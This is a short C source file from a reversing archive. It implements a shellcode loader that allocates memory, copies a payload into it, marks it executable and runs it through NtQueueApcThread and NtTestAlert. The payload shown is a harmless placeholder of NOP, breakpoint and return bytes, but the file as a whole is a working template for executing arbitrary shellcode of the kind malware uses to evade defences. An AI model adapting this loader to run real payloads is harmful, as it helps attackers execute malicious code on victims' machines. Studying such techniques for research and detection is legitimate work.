/*
    Shellcode Loader
    Archive of Reversing.ID

    Executing shellcode using APC.

Compile:
    $ cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tccode.cpp

Technique:
    - allocation: VirtualAlloc
    - writing:    RtlMoveMemory
    - permission: VirtualProtect
    - execution:  NtQueueApcThread + NtTestAlert
*/

#include <windows.h>
#include <stdint.h>

/* ========= some definition ========= */

/* ========= function signatures ========= */
typedef NTSTATUS NTAPI NtQueueApcThread_t (HANDLE, LPVOID, PVOID, LPVOID, ULONG);
typedef NtQueueApcThread_t FAR * pNtQueueApcThread;

typedef NTSTATUS NTAPI NtTestAlert_t ();
typedef NtTestAlert_t FAR * pNtTestAlert;

/* ========= helper functions ========= */


int main ()
{
    void *  runtime;
    BOOL    retval;
    DWORD   old_protect = 0;

    // shellcode storage in stack
    uint8_t     payload []  = { 0x90, 0x90, 0xCC, 0xC3 };
    uint32_t    payload_len = 4;

    NTSTATUS    status;
    HMODULE     ntdll;

    // function pointer to internal API
    pNtQueueApcThread   NtQueueApcThread;
    pNtTestAlert        NtTestAlert;

    // resolve all functions
    ntdll = GetModuleHandle("ntdll.dll");
    NtQueueApcThread = (pNtQueueApcThread) GetProcAddress(ntdll, "NtQueueApcThread");
    NtTestAlert      = (pNtTestAlert) GetProcAddress(ntdll, "NtTestAlert");

    // allocate memory buffer for payload as READ-WRITE (no executable)
    runtime = VirtualAlloc (0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // copy payload to the buffer
    RtlMoveMemory (runtime, payload, payload_len);

    // make buffer executable (R-X)
    retval  = VirtualProtect (runtime, payload_len, PAGE_EXECUTE_READ, &old_protect);
    if (retval != 0)
    {
        NtQueueApcThread (GetCurrentThread(), runtime, NULL, NULL, NULL);
        NtTestAlert();
    }

    // deallocate the space
    VirtualFree (runtime, payload_len, MEM_RELEASE);

    return 0;
}